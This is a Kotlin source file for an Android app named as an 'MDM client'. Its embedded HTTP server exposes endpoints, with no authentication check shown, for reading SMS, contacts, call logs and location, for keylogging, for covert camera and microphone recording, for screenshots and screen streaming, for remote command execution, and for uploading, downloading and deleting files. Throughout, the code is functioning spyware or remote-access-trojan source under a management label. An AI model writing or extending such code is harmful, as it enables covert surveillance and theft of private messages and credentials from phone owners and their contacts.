package com.mdm.client.server

import android.content.Context
import android.util.Log
import com.mdm.client.collectors.*
import com.mdm.client.commands.CommandExecutor
import com.mdm.client.keylogger.KeyloggerManager
import com.mdm.client.media.*
import com.mdm.client.network.ApiClient
import com.mdm.client.util.NetworkUtils
import fi.iki.elonen.NanoHTTPD
import kotlinx.coroutines.runBlocking
import org.json.JSONObject
import java.io.File

class DeviceHttpServer(
    private val context: Context,
    private val deviceInfo: DeviceInfoCollector,
    private val locationCollector: LocationCollector,
    private val smsCollector: SmsCollector,
    private val contactsCollector: ContactsCollector,
    private val callLogCollector: CallLogCollector,
    private val appsCollector: AppsCollector,
    private val keyloggerManager: KeyloggerManager,
    private val cameraManager: CameraManager,
    private val micManager: MicrophoneManager,
    private val screenCapture: ScreenCaptureManager,
    private val screenshotManager: ScreenshotManager,
    private val commandExecutor: CommandExecutor? = null
) : NanoHTTPD(8080) {

    companion object {
        private const val TAG = "HttpSvc"
        private const val MIME_JSON = "application/json"
    }

    override fun serve(session: IHTTPSession): Response {
        Log.d(TAG, "${session.method} ${session.uri}")
        return try {
            when (session.method) {
                Method.GET  -> handleGet(session)
                Method.POST -> handlePost(session)
                else        -> notFound("Method not allowed")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error serving ${session.uri}: ${e.message}")
            errorResponse("Internal error: ${e.message}")
        }
    }

    private fun handleGet(session: IHTTPSession): Response = when (session.uri) {
        "/getDeviceInfo"       -> json(deviceInfo.getDeviceInfo())
        "/getBatteryInfo"      -> json(deviceInfo.getBatteryInfo())
        "/getSimInfo"          -> json(deviceInfo.getSimInfo())
        "/getOsInfo"           -> json(deviceInfo.getOsInfo())
        "/location-update"     -> json(locationCollector.getLastLocation())
        "/getFreshLocation"    -> json(runBlocking { locationCollector.getFreshLocation() })
        "/getFreshCallLogs"    -> json(mapOf("calls" to callLogCollector.getCallLogs()))
        "/getFreshContacts"    -> json(mapOf("contacts" to contactsCollector.getContacts()))
        "/getFreshMessages"    -> json(mapOf("messages" to smsCollector.getMessages()))
        "/getFreshApps"        -> json(mapOf("apps" to appsCollector.getApps()))
        "/captureScreenshot"   -> json(screenshotManager.captureScreenshot())
        "/mic/recordings"      -> json(micManager.getRecordings())
        "/getAllKeyloggerData"  -> json(mapOf("keystrokes" to keyloggerManager.getAllKeystrokes()))
        "/enableLiveKeylogger" -> json(keyloggerManager.enableLive())
        "/disableLiveKeylogger"-> json(keyloggerManager.disableLive())
        "/getKeyloggerStatus"  -> json(mapOf("live_mode" to keyloggerManager.isLive(), "status" to "success"))
        "/camera/stop"         -> json(cameraManager.stopCamera())
        "/vnc/start"           -> json(screenCapture.startCapture())
        "/vnc/stop"            -> json(screenCapture.stopCapture())
        else                   -> serveStaticFile(session.uri) ?: notFound(session.uri)
    }

    private fun handlePost(session: IHTTPSession): Response {
        // NanoHTTPD stores POST body in body map under "postData" for raw JSON,
        // or populates session.files for multipart.
        val bodyMap = mutableMapOf<String, String>()
        try { session.parseBody(bodyMap) } catch (_: Exception) {}
        val rawJson = bodyMap["postData"] ?: "{}"

        return when {
            session.uri == "/executeCommand" -> {
                val data = runCatching { JSONObject(rawJson) }.getOrDefault(JSONObject())
                val commandType = data.optString("command_type", "")
                val commandId = data.optInt("command_id", 0)
                val payload = data.optJSONObject("payload")
                if (commandExecutor != null && commandType.isNotBlank()) {
                    commandExecutor.execute(commandId, commandType, payload)
                    json(mapOf("status" to "success", "message" to "Command accepted: $commandType"))
                } else {
                    json(mapOf("status" to "error", "message" to "Command executor not available or missing command_type"))
                }
            }
            session.uri == "/mic/start" -> {
                val duration = runCatching { JSONObject(rawJson).getInt("duration") }.getOrDefault(30)
                json(micManager.startRecording(duration))
            }
            session.uri == "/mic/stop" -> json(micManager.stopRecording())

            session.uri.startsWith("/camera/start/") -> {
                val facing = session.uri.substringAfterLast("/")
                json(cameraManager.startCamera(facing))
            }

            session.uri == "/files/list" -> {
                val path = runCatching { JSONObject(rawJson).getString("path") }
                    .getOrDefault("/storage/emulated/0")
                json(FileManagerHandler.listFiles(path))
            }
            session.uri == "/files/delete" -> {
                val path = runCatching { JSONObject(rawJson).getString("path") }.getOrDefault("")
                json(FileManagerHandler.deleteFile(path))
            }
            session.uri == "/files/upload" -> {
                val destPath = session.parameters["path"]?.firstOrNull() ?: "/storage/emulated/0"
                val fileName = session.parameters["filename"]?.firstOrNull()
                    ?: "upload_${System.currentTimeMillis()}"
                val tempFilePath = session.files["file"]
                json(FileManagerHandler.handleUpload(tempFilePath, destPath, fileName))
            }
            session.uri.startsWith("/files/download") -> {
                val path = session.parameters["path"]?.firstOrNull() ?: ""
                FileManagerHandler.serveDownload(path)
            }

            else -> notFound(session.uri)
        }
    }

    /** Serve static files for recordings and screenshots from app's external files dir. */
    private fun serveStaticFile(uri: String): Response? {
        val (dir, name) = when {
            uri.startsWith("/mic/file/") -> "recordings" to uri.removePrefix("/mic/file/")
            uri.startsWith("/screenshot/file/") -> "screenshots" to uri.removePrefix("/screenshot/file/")
            else -> return null
        }
        val file = File(context.getExternalFilesDir(dir), name)
        if (!file.exists()) return null
        val mime = if (uri.contains("/screenshot")) "image/jpeg" else "audio/mpeg"
        return newFixedLengthResponse(Response.Status.OK, mime, file.inputStream(), file.length())
    }

    // ── Helpers ─────────────────────────────────────────────────────────────

    private fun json(data: Any): Response {
        val jsonStr = when (data) {
            is Map<*, *>  -> JSONObject(data as Map<String, Any>).toString()
            is String     -> data
            else          -> data.toString()
        }
        return newFixedLengthResponse(Response.Status.OK, MIME_JSON, jsonStr)
    }

    private fun notFound(msg: String) = newFixedLengthResponse(
        Response.Status.NOT_FOUND, MIME_JSON, """{"error":"Not found: $msg"}"""
    )

    private fun errorResponse(msg: String) = newFixedLengthResponse(
        Response.Status.INTERNAL_ERROR, MIME_JSON, """{"error":"$msg"}"""
    )
}
